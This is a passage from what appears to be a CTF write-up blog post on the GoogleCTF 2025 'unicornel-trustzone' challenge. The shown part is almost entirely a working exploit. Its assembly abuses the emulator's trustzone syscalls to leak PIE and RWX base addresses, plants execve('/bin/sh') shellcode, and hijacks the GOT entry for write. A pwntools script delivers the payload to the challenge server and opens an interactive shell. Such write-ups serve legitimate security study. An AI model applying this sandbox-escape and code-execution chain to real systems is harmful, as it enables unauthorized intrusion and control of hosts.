+</span><span style=color:#b8bb26>    mov rbx, 0x1000
+</span><span style=color:#b8bb26>    mov rax, 3
+</span><span style=color:#b8bb26>    int 0x80 
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call create_trustzone to change perms </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rbx, 0x4000
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip + memprot_x86_64]
+</span><span style=color:#b8bb26>    mov rax, 8
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>    
+</span><span style=color:#b8bb26>    mov rbx, 0x4000
+</span><span style=color:#b8bb26>    mov rcx, 0x1000
+</span><span style=color:#b8bb26>    mov rdx, 0x7
+</span><span style=color:#b8bb26>    lea rdi, </span><span style=color:#fdf4c1>[rip + password]
+</span><span style=color:#b8bb26>    mov rax, 10
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> overwrite trustzone to validate_handle and store return pointer at r12 and write </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+leak_shared]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+leak_shared_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    mov rax, 10 </span><span style=font-style:italic;color:#928374>#call invoke_trustzone with the custom shellcode leak_shared at the created trustzone
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> leak PIE base and RWX base address </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+leak_pie_rwx]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+leak_pie_rwx_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    mov rax, 10 </span><span style=font-style:italic;color:#928374>#call invoke trustzone to execute pie leak instructions
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>    
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> fill trustzone with code for rce and invoke </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    add r10, 0x444400 # We plan to inject shellcode in the rwx</span><span style=color:#fe8019>+</span><span style=color:#b8bb26>0x44000 area
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+load_rce]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+load_rce_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> invoke trustzone -- r10 = rwx r11 = pie </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rax, 10
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> map got to rce code </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    add r11, 0x120c050 </span><span style=font-style:italic;color:#928374># got address for write
+</span><span style=color:#b8bb26>    mov rdi, 0x4000
+</span><span style=color:#b8bb26>    lea rsi, </span><span style=color:#fdf4c1>[rip+load_got]
+</span><span style=color:#b8bb26>    lea rcx, </span><span style=color:#fdf4c1>[rip+load_got_end]
+</span><span style=color:#b8bb26>    sub rcx, rsi
+</span><span style=color:#b8bb26>    rep movsb
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> invoke trustzone that maps 0x8000 to got of write so that we can access it in emulator vspace </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rax, 10
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Spawn shell  </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>    mov rbx, 0x8000
+</span><span style=color:#b8bb26>    mov rcx, 0x1
+</span><span style=color:#b8bb26>    mov rax, 0x1
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    mov rax, 0x6
+</span><span style=color:#b8bb26>    int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>    leak_shared:
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call validate_handle 0 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        xor rbx, rbx
+</span><span style=color:#b8bb26>        xor rcx, rcx
+</span><span style=color:#b8bb26>        mov rax, 4
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        mov r12, rax </span><span style=font-style:italic;color:#928374># store leaked value at r12
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Print leak for debugging purposes </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, rax
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>    leak_shared_end:
+</span><span style=color:#b8bb26>    leak_pie_rwx:
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Call map_address </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        mov rcx, 0x2000
+</span><span style=color:#b8bb26>        mov rdx, r12 # r12 is shared_buffers</span><span style=color:#fdf4c1>[0]
+</span><span style=color:#b8bb26>        sub rdx, 0x12bf0 # map to the base of area instead of to the shared_buffers</span><span style=color:#fdf4c1>[0]
+</span><span style=color:#b8bb26>        mov rax, 5
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Store leaked pie at r11 and leaked rwx at r10 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        add rbx, 0x1100
+</span><span style=color:#b8bb26>        mov r11, qword ptr </span><span style=color:#fdf4c1>[rbx]
+</span><span style=color:#b8bb26>        sub r11, 0x785b20 </span><span style=font-style:italic;color:#928374># r11 = PIE BASE
+</span><span style=color:#b8bb26>        mov rbx, 0x5000
+</span><span style=color:#b8bb26>        add rbx, 0x0b88
+</span><span style=color:#b8bb26>        mov r10, qword ptr </span><span style=color:#fdf4c1>[rbx]
+</span><span style=color:#b8bb26>        sub r10, 0x1c2f </span><span style=font-style:italic;color:#928374># r10 = RWX BASE
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Print for debugging purposes </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, r11
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        mov rbx, r10
+</span><span style=color:#b8bb26>        mov rax, 0x2
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>    leak_pie_rwx_end:
+</span><span style=color:#b8bb26>    load_rce:
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> map_address of 0x7000 to rwx address of choice where we will write rce code</span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x7000
+</span><span style=color:#b8bb26>        mov rcx, 0x1000
+</span><span style=color:#b8bb26>        mov rdx, r10 </span><span style=font-style:italic;color:#928374># r10 = rwx address
+</span><span style=color:#b8bb26>        mov rax, 5
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> Fill shellcode to rwx which is mapped at 0x7000 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rdi, 0x7000
+</span><span style=color:#b8bb26>        lea rsi, </span><span style=color:#fdf4c1>[rip+get_shell]
+</span><span style=color:#b8bb26>        lea rcx, </span><span style=color:#fdf4c1>[rip+get_shell_end]
+</span><span style=color:#b8bb26>        sub rcx, rsi
+</span><span style=color:#b8bb26>        rep movsb
+</span><span style=color:#b8bb26>        get_shell:
+</span><span style=color:#b8bb26>            lea rdi, </span><span style=color:#fdf4c1>[rip+binsh_str]
+</span><span style=color:#b8bb26>            xor rsi, rsi
+</span><span style=color:#b8bb26>            xor rdx, rdx
+</span><span style=color:#b8bb26>            mov rax, 0x3b
+</span><span style=color:#b8bb26>            syscall
+</span><span style=color:#b8bb26>            binsh_str:
+</span><span style=color:#b8bb26>                </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "/bin/sh\0"
+</span><span style=color:#b8bb26>        get_shell_end:
+</span><span style=color:#b8bb26>    load_rce_end:
+</span><span style=color:#b8bb26>    load_got:
+</span><span style=color:#b8bb26>         /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> map_address of 0x8000 to got address </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov rbx, 0x8000
+</span><span style=color:#b8bb26>        mov rcx, 0x1000
+</span><span style=color:#b8bb26>        mov rdx, r11 </span><span style=font-style:italic;color:#928374># r11 = write GOT address
+</span><span style=color:#b8bb26>        mov rax, 5
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> overwrite 0x8000 which contains the got entry for write with r10 -> addr to shellcode </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov qword ptr </span><span style=color:#fdf4c1>[rbx]</span><span style=color:#b8bb26>, r10
+</span><span style=color:#b8bb26>    load_got_end:
+</span><span style=color:#b8bb26>    password:
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "sup3r_s3cure_sj\0"
+</span><span style=color:#b8bb26>    memprot_x86_64:
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>ascii "memprot_x86_64\0"
+</span><span style=color:#b8bb26>'''</span><span style=color:#fdf4c1>)
+</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"unicornel-tz.2025.ctfcompetition.com"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' solve '</span><span style=color:#fdf4c1>)
+</span><span>to_solve </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvline().strip().decode()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>sol </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>os.popen(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"python3 kctf-pow.py solve </span><span style=color:#fdf4c1>{to_solve}</span><span style=color:#b8bb26> 2>/dev/null"</span><span style=color:#fdf4c1>).read() </span><span style=font-style:italic;color:#928374>#kctf-pow solver
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(sol)
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Solution? "</span><span style=color:#fdf4c1>, sol.encode())
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>' unicornel!'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Given format of header for the emulator
+</span><span>header </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>flat(
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_ARCH_X86),
+</span><span style=color:#fdf4c1>    p32(unicorn.UC_MODE_64),
+</span><span style=color:#fdf4c1>    p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>), p64(</span><span style=color:#d3869b>0x1000</span><span style=color:#fdf4c1>),          
+</span><span style=color:#fdf4c1>    </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>3 </span><span style=color:#fe8019>* </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>,              
+</span><span style=color:#fdf4c1>    p16(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(code)),              
+</span><span style=color:#fdf4c1>    p8(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)                        
+</span><span style=color:#fdf4c1>).ljust(</span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\0'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'DATA_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(header)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'CODE_START'</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.send(code)
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#b8bb26>'pid 0\n'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>leaked_buf_addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_buf_addr) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span><span>leaked_pie_base </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_pie_base) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span><span>leaked_rwx_base </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(p.recvline().strip().decode())
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>{</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(leaked_rwx_base) = }</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.interactive()
+</span></code></pre><p><img alt src=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/./final-exp.png><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
